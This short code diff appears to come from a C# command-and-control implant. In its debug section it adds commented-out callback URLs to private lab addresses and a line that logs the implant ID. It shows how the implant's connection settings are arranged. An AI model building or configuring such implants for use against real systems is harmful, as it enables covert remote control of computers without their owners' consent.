@@ -51,10 +51,14 @@ namespace EntryPoint
 #if DEBUG
             Debug.Listeners.Add(new TextWriterTraceListener(Console.Out));
 
-            //connUrl = "https://192.168.48.128:443";
+            //connUrl = "https://192.168.48.134:443";
+            //connUrl = "http://192.168.48.134:2000";
             //connUrl = "pipe://127.0.0.1:C3PO";
             //connUrl = "http://127.0.0.1:8080";
             //connUrl = "tcp://*:4444";
+
+            //connUrl = "http://127.0.0.1:2000";
+
 
             if (_args.Count() > 0)
             {
@@ -77,6 +81,7 @@ namespace EntryPoint
 
             Debug.WriteLine($"Endpoint is {connUrl}.");
             Debug.WriteLine($"ServerKey is {serverKey}.");
+            Debug.WriteLine($"Implant is {implantId}.");
 
             if (!connexion.IsValid)
             {
